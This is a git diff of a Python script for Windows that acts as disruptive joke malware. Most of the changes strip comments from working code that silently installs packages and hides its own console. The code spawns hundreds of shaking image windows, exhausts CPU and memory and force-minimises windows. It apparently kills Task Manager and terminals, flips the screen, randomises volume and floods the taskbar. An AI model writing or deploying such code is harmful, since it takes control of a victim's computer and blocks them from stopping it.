@@ -1,6 +1,6 @@
 import sys
 import subprocess
-import psutil  # Add this import at the top
+import psutil
 import ctypes
 import win32gui
 import win32con
@@ -16,7 +16,6 @@ def install_and_import(package, import_name=None):
             stderr=subprocess.DEVNULL
         )
 
-# Auto-install requirements silently
 install_and_import("pillow", "PIL")
 install_and_import("playsound")
 install_and_import("psutil")
@@ -31,7 +30,6 @@ import time
 import os
 from playsound import playsound
 
-# Local image filenames - make sure these files exist in the script's folder
 IMAGE_FILES = [
     "1.jpg",
     "2.jpg",
@@ -61,7 +59,6 @@ CATGIRL_SOUNDS = [
     "1.mp3",
     "2.mp3",
     "3.mp3"
-    # Add more sound filenames here
 ]
 
 pressed_keys = set()
@@ -77,7 +74,6 @@ def fetch_image(filename):
         image = Image.open(path).resize((150, 150), Image.ANTIALIAS)
         return ImageTk.PhotoImage(image)
     except Exception:
-        # fallback blank image (light pink)
         blank = Image.new('RGBA', (150, 150), (255, 182, 193, 255))
         return ImageTk.PhotoImage(blank)
 
@@ -88,7 +84,6 @@ def create_window(root, image, caption):
     win.configure(background='#ff9cea')
     screen_width = win.winfo_screenwidth()
     screen_height = win.winfo_screenheight()
-    # Make windows very large to cover more area
     win_width, win_height = int(screen_width * 0.7), int(screen_height * 0.7)
     x = randint(0, screen_width - win_width)
     y = randint(0, screen_height - win_height)
@@ -121,7 +116,6 @@ def create_window(root, image, caption):
     win.bind('<Button-1>', start_drag)
     win.bind('<B1-Motion>', do_drag)
 
-    # Annoying effect: shake window
     def shake():
         if not running:
             return
@@ -148,7 +142,6 @@ def spawn_windows(root):
     global running
     while running:
         with windows_lock:
-            # Try to spawn up to 5 windows per iteration
             for _ in range(5):
                 if len(windows) < 200:
                     filename = choice(IMAGE_FILES)
@@ -157,7 +150,7 @@ def spawn_windows(root):
                     win = create_window(root, img, caption)
                     windows.append(win)
                     play_catgirl_sound()
-        time.sleep(0.005)  # Even faster spawning
+        time.sleep(0.005)
 
 def cpu_stress():
     while running:
@@ -168,7 +161,7 @@ def cpu_stress():
 def memory_stress():
     mem_list = []
     while running:
-        mem_list.append([0]*1000000)  # Allocate more memory
+        mem_list.append([0]*1000000) 
         time.sleep(0.1)
 
 def key_press(event):
@@ -198,14 +191,12 @@ def close_task_manager_and_terminal():
     TERMINAL_PROCESSES = [
         "cmd.exe", "powershell.exe", "wt.exe", "conhost.exe", "terminal.exe"
     ]
-    # Hide the current console window (the one running this script)
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except Exception:
         pass
 
     while running:
-        # Minimize all windows
         try:
             win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_FORCEMINIMIZE)
         except Exception:
@@ -241,7 +232,6 @@ def show_resource_usage():
     update_usage()
 
 def set_wallpaper(image_path):
-    # Converts image to BMP and sets as wallpaper
     import tempfile
     from PIL import Image
     bmp_image = Image.open(image_path)
@@ -252,12 +242,10 @@ def set_wallpaper(image_path):
 
 def annoy_user():
     while running:
-        # Flash the taskbar
         try:
             ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
         except:
             pass
-        # Play a beep
         try:
             import winsound
             winsound.Beep(randint(200, 2000), 100)
@@ -328,7 +316,6 @@ def random_volume():
     volume = cast(interface, POINTER(IAudioEndpointVolume))
     while running:
         try:
-            # Set volume to a random level
             volume.SetMasterVolumeLevelScalar(random.uniform(0.0, 1.0), None)
         except:
             pass
@@ -337,12 +324,10 @@ def random_volume():
 def flip_screen():
     while running:
         try:
-            # 0 = default, 1 = 90, 2 = 180, 3 = 270 degrees
             orientation = randint(0, 3)
             ctypes.windll.user32.ChangeDisplaySettingsW(None, 0)
             dm = ctypes.create_string_buffer(220)
             ctypes.windll.user32.EnumDisplaySettingsW(None, 0, dm)
-            # Offset 72 is dmDisplayOrientation in DEVMODE struct
             ctypes.memset(ctypes.addressof(dm) + 72, orientation, 4)
             ctypes.windll.user32.ChangeDisplaySettingsW(dm, 0)
         except:
@@ -373,16 +358,16 @@ def flood_taskbar():
             subprocess.Popen(app, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
             pass
-        time.sleep(0.2)  # Adjust for more/less flooding
+        time.sleep(0.2) 
 
 if __name__ == "__main__":
     root = tk.Tk()
     root.withdraw()
 
-    # Set wallpaper to a catgirl image
-    set_wallpaper("2.jpg")  # Change to any image in IMAGE_FILES
 
-    show_resource_usage()  # Show resource monitor
+    set_wallpaper("2.jpg")  
+
+    show_resource_usage() 
 
     root.bind_all("<KeyPress>", key_press)
     root.bind_all("<KeyRelease>", key_release)
